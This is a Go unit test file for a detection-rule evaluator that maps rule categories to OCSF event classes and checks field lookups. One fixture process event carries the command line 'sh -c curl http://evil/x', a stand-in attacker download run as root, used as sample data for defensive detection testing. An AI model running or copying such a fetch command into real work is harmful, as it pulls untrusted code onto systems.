package ruleeval

import (
	"testing"
	"time"

	"github.com/t3rmit3/slither/pkg/ocsf"
	"github.com/t3rmit3/slither/pkg/ruleast"
)

func TestCategoryToClassCoversPhase1(t *testing.T) {
	cases := map[ruleast.Category]ocsf.ClassID{
		ruleast.CategoryProcessCreation:   ocsf.ClassProcessActivity,
		ruleast.CategoryFileEvent:         ocsf.ClassFileSystemActivity,
		ruleast.CategoryNetworkConnection: ocsf.ClassNetworkActivity,
	}
	for cat, want := range cases {
		got, ok := CategoryToClass(cat)
		if !ok || got != want {
			t.Errorf("CategoryToClass(%q) = (%d, %v) want (%d, true)", cat, got, ok, want)
		}
	}
}

func TestEnvLookupOnProcessActivity(t *testing.T) {
	ts := time.Now().UnixMilli()
	ev := &ocsf.ProcessActivity{
		Metadata:   ocsf.Metadata{Version: ocsf.Version, OriginalT: ts, UID: "ev-1"},
		ClassUID:   ocsf.ClassProcessActivity,
		ClassName:  ocsf.ClassProcessActivity.String(),
		ActivityID: ocsf.ProcessActivityLaunch,
		Severity:   ocsf.SeverityInformational,
		Time:       ocsf.TimeOCSF(ts),
		Process: ocsf.Process{
			PID:     1234,
			Name:    "sh",
			Cmdline: "sh -c curl http://evil/x",
			File:    &ocsf.File{Path: "/bin/sh"},
			User:    &ocsf.User{Name: "root", UID: "0"},
		},
	}
	env := EnvFor(ev, AccessorFor(ruleast.CategoryProcessCreation))
	for _, field := range []string{"Image", "CommandLine", "User", "ProcessId"} {
		v, ok := env.Lookup(field)
		if !ok || len(v) == 0 {
			t.Errorf("Lookup(%q) miss, want hit", field)
		}
	}
	if _, ok := env.Lookup("NotAField"); ok {
		t.Errorf("Lookup of unknown field should miss")
	}
}
